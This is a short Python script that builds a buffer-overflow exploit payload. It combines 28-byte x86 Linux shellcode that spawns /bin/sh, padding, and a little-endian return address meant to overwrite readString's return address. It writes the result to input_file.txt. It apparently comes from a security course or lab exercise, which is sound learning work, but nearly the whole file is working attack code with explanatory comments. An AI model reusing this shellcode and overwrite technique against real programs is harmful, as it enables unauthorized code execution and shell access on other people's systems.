import struct

# this is a 28 byte shellcode for Linux Intel x86 that performs execve /bin/sh 
# 28-byte shellcode: https://shell-storm.org/shellcode/files/shellcode-811.html
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# we add padding since the start of the buf variable has 48-bytes gap until the return address of readString
padding = b'\x90'*20

# we need to write the address in reverse using this command because Linux Intel x86 is little endian
name_address = struct.pack("I", 0x80dacc0)

# the return address of readString will be overwritten with the start address of the name variable
exploit_payload = shellcode + padding + name_address

# write the exploit payload to input_file.txt
with open('input_file.txt', 'wb') as file:
    file.write(exploit_payload)

